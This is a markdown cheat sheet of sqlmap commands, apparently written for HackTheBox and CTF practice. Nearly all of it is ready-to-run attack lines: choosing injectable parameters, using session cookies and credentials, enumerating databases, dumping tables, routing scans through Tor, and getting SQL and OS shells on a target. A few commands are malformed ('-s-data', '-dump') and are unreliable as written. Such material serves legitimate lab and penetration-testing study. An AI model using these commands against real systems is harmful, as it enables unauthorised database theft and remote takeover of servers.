---
layout: memory
title: sqlmap Cheatsheet
---

Quick writeup and cheat sheet for [sqlmap](https://github.com/sqlmapproject/sqlmap) the automated SQLi and database takeover tool to speed up HTB/CTFs

<!-- cSpell:disable -->

### Simple usage
```bash
sqlmap -u "$URL"
```

### Specify target DBMS to MySQL
```bash
sqlmap -u "$URL" --dbms=mysql
```

### Using a proxy
```bash
sqlmap -u "$URL" --proxy=http://proxy_address:port
```

### Specify param1 to exploit
```bash
sqlmap -u "$URLparam1=value1&param2=value2" -p param1
```

### Use POST requests
```bash
sqlmap -u "http://target_server" --data=param1=value1&param2=value2
```

### Access with authenticated session
```bash
sqlmap -u "http://target_server" --data=param1=value1&param2=value2 -p param1 cookie='my_cookie_value'
```

### Basic authentication
```bash
sqlmap -u "http://target_server" -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
```

### Specify parameter to exploit
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2
```

### Specify parameter to exploit in 'nice' URIs
```bash
sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs # exploits param1
```

### Evaluating response strings
```bash
sqlmap -u "$URL" --string="This string if query is TRUE"
sqlmap -u "$URL" --not-string="This string if query is FALSE"
```

### List databases
```bash
sqlmap -u "$URL" --dbs
```

### List databases
```bash
sqlmap -u "$URL" --dbs
```

### List tables of database target_DB
```bash
sqlmap -u "$URL" -D target_DB --tables
```

### Dump table target_Table of database target_DB
```bash
sqlmap -u "$URL" -D target_DB -T target_Table -dump
```

### List columns of table target_Table of database target_DB
```bash
sqlmap -u "$URL" -D target_DB -T target_Table --columns
```

### Scan through TOR
```bash
sqlmap -u "$URL" --tor --tor-type=SOCKS5
```

### Get SQL Shell
```bash
sqlmap -u "$URL" --sql-shell
```

### Get OS Shell
```bash
sqlmap -u "$URL" --os-shell
```
<!-- cSpell:enable -->
